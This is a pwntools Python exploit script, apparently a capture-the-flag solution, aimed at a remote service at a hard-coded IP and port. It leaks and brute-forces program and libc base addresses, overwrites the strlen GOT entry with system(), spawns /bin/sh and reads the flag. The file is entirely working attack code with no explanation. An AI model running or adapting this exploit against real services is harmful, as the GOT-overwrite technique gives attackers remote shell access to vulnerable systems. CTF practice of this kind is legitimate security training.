#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("app_patched")
libc = ELF("./libc.so.6")

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


host , port = "58.229.185.61", "10002"
p = remote(host,port)

# get .bss copy zone
leak1 = int(rcu('Saved : ', '\n'),16)
logleak('leak1', leak1)

# brute force real .bss address & eventually calculate prog base with it (not really needed)
q = process('./rev2 '+hex(leak1>>12), shell=True)
q.recvuntil('= ', drop=True)
exe.address = int(q.recvuntil('\n'),16) - 0x4000
q.close()
logleak('prog base', exe.address)

# leak libc copy zone
leak2 = int(rcu('Saved : ', '\n'),16)
q = process('./rev3 '+hex(leak2>>12), shell=True)
q.recvuntil('= ', drop=True)
libc.address = int(q.recvuntil('\n'),16) + 0x3000
q.close()
logbase()

# bruteforce crc32 for a zone before the .bss copy zone
count = 0x1000
while (True):
  q = process('./rev2b '+hex((leak1-count)>>12), shell=True)
  try:
    q.recvuntil('found = ', drop=True)
    crc = int(q.recvuntil('\n'),16)
    q.close()
    break
  except:
    q.close()
    count += 0x1000

print('crc = '+hex(crc))

# try to allocate a zone just before .bss copy zone, with a size that contains it
sla('> ', '2')
sa('> ', p64(crc))
sla('> ', str(count+0x3000))

leak3 = int(rcu('Your Map: ', '\n'),16)
logleak("offset", leak1-leak3)

# write in the .bss copy zone, the strlen .got entry with system() address
sla('> ', '4')
sla('> ', str((leak1-leak3)+0x30))
p.write(p64(libc.sym['system']))

# load memoy (copy back w zones in the program)
sla('> ', '1')
# execute /bin/sh via strlen(buff)
sla('> ', '2')
sa('> ', '/bin/sh\x00')
sla('> ', "1")

p.sendline('id;cat flag*;echo done')

p.interactive()

